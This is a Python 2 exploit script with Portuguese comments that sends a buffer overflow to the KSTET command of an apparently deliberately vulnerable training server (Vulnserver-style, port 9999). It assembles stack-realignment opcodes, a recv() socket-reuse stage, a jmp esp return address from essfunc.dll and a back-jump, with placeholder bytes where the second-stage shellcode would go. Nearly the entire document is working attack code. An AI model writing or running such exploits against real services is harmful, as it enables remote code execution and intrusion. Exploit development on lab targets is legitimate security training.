#!/usr/bin/python
# -*- coding: utf-8 -*-

import sys
import socket
from time import sleep
from struct import *

host= "172.30.200.66"

port = 9999

payload  = ""

# Estagio 2 -> Realinhamento da pilha para encontrar o FileDescriptor
payload += "\x54"                   # push esp
payload += "\x59"                   # pop ecx
payload += "\x66\x81\xE9\x44\x01"   # sub cx,0x144


# Reajusta a posição de ESP
# como o ESP  (pilha) está abaixo deste payload, iremos reajustar para uma posição acima
payload += "\x83\xEC\x50"           # sub esp 50

# Estagio 3 -> Calcular parametros do recv
# int recv( SOCKET s, char   *buf, int    len, int    flags );
# Adiciona o 4 parametro (flags)
payload += "\x31\xC0"               # xor eax,eax --> Zera EAX
payload += "\x50"                   # push eax
# Adiciona o 3 parametro (int)
payload += "\x31\xC0"               # xor eax,eax --> Zera EAX
payload += "\xB0\x08"               # mov al,0x8
payload += "\xB4\x02"               # mov ah,0x2
payload += "\x50"                   # push eax --> EAX deve ter o valor 0x00000208 decimal 520
# Adiciona o 2 parametro (*buf), ou seja endereço do Buffer
payload += "\x54"                   # push esp
payload += "\x5A"                   # pop edx
payload += "\x83\xC2\x50"           # ADD EDX, 50
payload += "\x52"                   # push edx
# Adiciona o 1 parametro (socket)
payload += "\xFF\x31"               # PUSH DWORD PTR DS:[ECX]


payload += "\xCC"                   # Breakpoint
payload += "\x90" * (66 - len(payload)) # preenche com NOPs

payload += pack('<L',0x625011af)    # 0x625011af : jmp esp |  {PAGE_EXECUTE_READ} [essfunc.dll] ASLR: False, Rebase: False, SafeSEH: False, OS: False, v-1.0- (essfunc.dll)

# Estagio 1 -> JMP para o inicio do nosso payload (AAAA...)
payload += "\x54"                   # push esp
payload += "\x5A"                   # pop edx
payload += "\x83\xEA\x46"           # sub edx,byte +0x46
payload += "\xFF\xE2"               # jmp edx


buffer  = b"KSTET /.:/"
buffer += payload

shellcode = "E" * 520

print "[*] Enviando requisicao maliciosa ... :)"

exp = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

exp.connect((host,port))
exp.recv(4096)

exp.send(buffer)
sleep(1)
exp.send(shellcode)

exp.close()


